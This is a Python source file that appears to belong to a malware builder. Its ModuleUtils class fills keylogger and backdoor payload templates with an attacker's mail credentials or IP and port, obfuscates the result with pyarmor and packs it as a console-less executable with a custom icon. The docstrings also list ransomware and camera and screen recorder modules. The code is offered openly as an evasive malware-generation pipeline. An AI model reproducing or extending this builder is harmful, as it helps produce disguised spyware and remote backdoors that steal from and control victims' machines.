import os
import shutil
from ..variables.variables import *
from ..utils.utils import *

class ModuleUtils(Utils):
    """
    The ModuleUtils class provides various utility functions for different modules.
    This class offers a pipeline that includes generating payloads, obfuscation, converting to executable files,
    and cleaning up the process.
    """
    def __init__(self) -> None:
        """
        Constructor method for the ModuleUtils class.
        """
        super().__init__()
        
    def pipeline(self, **kwargs) -> None:
        """
        Executes the full pipeline for generating, obfuscating, converting to executable, and finalizing the payload.

        Args:
            kwargs: A dictionary of arguments containing the necessary parameters.
                Required keys for modules:
                    Keylogger:
                        - name (str): The name of the output file.
                        - module (str): The module name.
                        - icon_path (str): The path to the icon file for the executable.
                        - payload (str): The payload file name.
                        - mail (str): User email for payload replacement.
                        - password (str): User password for payload replacement.
                        - timeout (int): Timeout value for payload replacement.
                        
                    Ransomware:
                        - name (str): The name of the output file.
                        - module (str): The module name.
                        - icon_path (str): The path to the icon file for the executable.
                        - payload (str): The payload file name.
                    
                    CameraRecorder:
                        - name (str): The name of the output file.
                        - module (str): The module name.
                        - icon_path (str): The path to the icon file for the executable.
                        - payload (str): The payload file name.
                        - mail (str): User email for payload replacement.
                        - password (str): User password for payload replacement.
                        - timeout (int): Timeout value for payload replacement.
                    
                    ScreenRecorder:
                        - name (str): The name of the output file.
                        - module (str): The module name.
                        - icon_path (str): The path to the icon file for the executable.
                        - payload (str): The payload file name.
                        - mail (str): User email for payload replacement.
                        - password (str): User password for payload replacement.
                        - timeout (int): Timeout value for payload replacement.
                        
                    Backdoor:
                        - name (str): The name of the output file.
                        - module (str): The module name.
                        - icon_path (str): The path to the icon file for the executable.
                        - payload (str): The payload file name.
                        - ip (str): User IP for payload replacement (required for module_num 5).
                        - port (int): User port for payload replacement (required for module_num 5).
        
        Raises:
            IndexError: If an invalid module number is provided.
        """
        self.generate(kwargs=kwargs)
        self.obfuscate(name=kwargs.get("name"))
        self.convert_to_exe(module=kwargs.get("module"), name=kwargs.get("name"), icon_path=kwargs.get("icon_path"))
        self.final(name=kwargs.get("name"), module=kwargs.get("module"))
        
    def generate(self, kwargs) -> None:
        """
        Generates the payload file by replacing placeholders in the template payload with actual values.

        Args:
            kwargs: A dictionary of arguments containing the necessary parameters.
                Required keys for modules:
                    Keylogger:
                        - name (str): The name of the output file.
                        - module (str): The module name.
                        - icon_path (str): The path to the icon file for the executable.
                        - payload (str): The payload file name.
                        - mail (str): User email for payload replacement.
                        - password (str): User password for payload replacement.
                        - timeout (int): Timeout value for payload replacement.
                    
                    Backdoor:
                        - name (str): The name of the output file.
                        - module (str): The module name.
                        - icon_path (str): The path to the icon file for the executable.
                        - payload (str): The payload file name.
                        - ip (str): User IP for payload replacement (required for module_num 5).
                        - port (int): User port for payload replacement (required for module_num 5).
        
        Raises:
            IndexError: If an invalid module number is provided.
        """
        try:
            self.clear()
            payload_path : str = os.path.join("packages", "payloads", kwargs["module"], kwargs["payload"])
            payload_location = os.path.abspath(os.path.join(os.getcwd(), payload_path))
        
            match str(kwargs["module"]).lower():
                case "keylogger":
                    with open(kwargs["name"], "w", encoding="utf-8") as file:
                        with open(payload_location, 'r', encoding='utf-8') as file1:
                            file_content = file1.read()
                            file_content = file_content.replace("userMail_", kwargs["mail"])
                            file_content = file_content.replace("userPassword_", kwargs["password"])
                            file_content = file_content.replace("timeOut_", str(kwargs["timeout"]))
                            file.write(file_content)
                            
                case "backdoor":
                    with open(kwargs["name"], "w", encoding="utf-8") as file:
                        with open(payload_location, 'r', encoding='utf-8') as file1:
                            file_content = file1.read()
                            file_content = file_content.replace("userIP_", kwargs["ip"])
                            file_content = file_content.replace("userPort_", str(kwargs["port"]))
                            file.write(file_content)
                            
                case _:
                    raise ValueError(self.write(message="Invalid Module.", level=4))
        
        except FileNotFoundError:
            os.remove(kwargs["name"])
            
            self.write(message=f"Payload named {kwargs["payload"]} not found.", level=4, clear=True)
            sys.exit(1)

    def obfuscate(self, name : str) -> None:
        """
        Obfuscates the generated payload file using pyarmor.
        
        Args:
            name (str): The name of the file to obfuscate.
        """
        try:
            os.system(f"pyarmor gen {name}")

        except Exception as e:
            self.write(message=f"ERROR: {str(e)}.", level=4)
    
    def convert_to_exe(self, module : str, name : str, icon_path : str) -> None:
        """
        Converts the obfuscated payload file into an executable.
        
        Args:
            module (str): The name of the module to use.
            name (str): The name of the file to convert.
            icon_path (str): Path to the icon file to use.
        """
        match module.lower():
            case "keylogger":
                try:
                    if OS == "windows":
                        icon_option = f"--icon={icon_path}" if icon_path else ""
                        os.system(f"pyinstaller --onefile --hidden-import=email.mime --hidden-import=requests --hidden-import=pynput --hidden-import=win32gui \
                                --hidden-import=smtplib --hidden-import=email.mime.multipart --hidden-import=email.mime.text --hidden-import=email.mime.base \
                                --hidden-import=email --hidden-import=threading --hidden-import=pyarmor --hidden-import=tempfile --noconsole --clean {icon_option} .\\dist\\{name}")
                    else:
                        icon_option = f"--icon={icon_path}" if icon_path else ""
                        os.system(f"pyinstaller --onefile --hidden-import=email.mime --hidden-import=requests --hidden-import=pynput --hidden-import=win32gui \
                                --hidden-import=smtplib --hidden-import=threading --hidden-import=pyarmor --hidden-import=email.mime.multipart --hidden-import=email.mime.text \
                                --hidden-import=email.mime.base --hidden-import=email --hidden-import=tempfile --noconsole {icon_option} ./dist/{name}")
                
                except Exception as e:
                    self.write(f"ERROR: {str(e)}.", type=4)
                    
            case "backdoor":
                try:
                    if OS == "windows":
                        icon_option = f"--icon={icon_path}" if icon_path else ""
                        os.system(f"pyinstaller --onefile --hidden-import=socket --hidden-import=subprocess --hidden-import=time --hidden-import=json \
                                --hidden-import=os --hidden-import=base64 --hidden-import=pyarmor --noconsole --clean {icon_option} .\\dist\\{name}")
                    else:
                        icon_option = f"--icon={icon_path}" if icon_path else ""
                        os.system(f"pyinstaller --onefile --hidden-import=socket --hidden-import=subprocess --hidden-import=time --hidden-import=json \
                                --hidden-import=os --hidden-import=base64 --hidden-import=pyarmor --noconsole {icon_option} ./dist/{name}")
                
                except Exception as e:
                    self.write(f"ERROR: {str(e)}.", type=4)
                
            case _:
                raise ValueError(self.write("Invalid module.", level=4))
        
    def final(self, name : str, module : str) -> None:
        """
        Cleans up the process by removing temporary files and displaying the final location of the created executable.
        
        Args:
            name (str): The name of the file.
            module (str): The name of the module used.
        """
        self.name_exe = name.replace(".py", ".exe")
        self.exe_location = os.path.abspath(self.name_exe)
        self.parent_folder = os.path.abspath(os.path.join(self.exe_location, os.pardir))
        
        os.remove(os.path.join(self.parent_folder, name))
        os.remove(os.path.join(self.parent_folder, "dist", name))
        os.remove(os.path.join(self.parent_folder, name.replace("py", "spec")))
        
        shutil.rmtree(os.path.join(self.parent_folder, "dist", "pyarmor_runtime_000000"))
        shutil.rmtree(os.path.join(self.parent_folder, "build", name.replace(".py", "")))
        
        self.write(message=f"{module.capitalize()} Was Created On this Location: {os.path.join(self.parent_folder, "dist", self.name_exe)}", level=4, clear=False)
            
    def list_payloads(self, module : str) -> list[str]:
        """
        Lists available payloads for the specified module.
        
        Args:
            module (str): The name of the module to list payloads for.

        Returns:
            list[str]: A list of available payload names.
        """
        try:
            self.clear()
            payloads : list[str] = os.listdir(os.path.join("packages", "payloads", module))
            print(f"""{COLOR['CYAN']}
                ╔══════════════════════════════════════════════════════════════════════════╗
                ║*                               - PAYLOADS -                             *║
                ╠══════════════════════════════════════╦═══════════════════════════════════╣
                ║            Payload Number            ║           Payload Name            ║         
                ╠══════════════════════════════════════╩═══════════════════════════════════╣ """)
            i = 0
            for payload in payloads:
                i += 1
                print(f"\t\t║ [{i}] {COLOR['RESET']}{payload}{COLOR['CYAN']} {' ' * (68 - len(payload))}║")

            print("\t\t╚══════════════════════════════════════════════════════════════════════════╝")
            
            chc = input(f"\n  {"\t" * 5}Press [Enter] To Continue.  ")
            
            if chc == "":
                self.run()
                
            else:
                self.clear()
                self.listPayloads(module)
        
        except AttributeError:
            self.list_payloads(module)
        
        except Exception as e:
            self.write(message=f"ERROR: {str(e)}.", level=4, clear=True)